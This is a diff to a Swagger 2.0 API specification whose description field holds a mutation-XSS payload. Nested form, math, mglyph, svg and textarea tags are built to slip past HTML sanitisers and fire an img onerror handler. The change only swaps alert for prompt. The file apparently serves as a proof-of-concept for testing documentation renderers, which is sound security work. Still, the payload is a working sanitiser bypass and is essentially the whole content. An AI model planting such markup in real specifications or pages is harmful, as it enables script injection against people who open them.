@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(String.fromCharCode(68,79,77,88,83,83,82,105,118,101,107)) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=prompt(String.fromCharCode(68,79,77,88,83,83,82,105,118,101,107)) src=1>"></form>
 
   version: production
 basePath: /JSSResource/
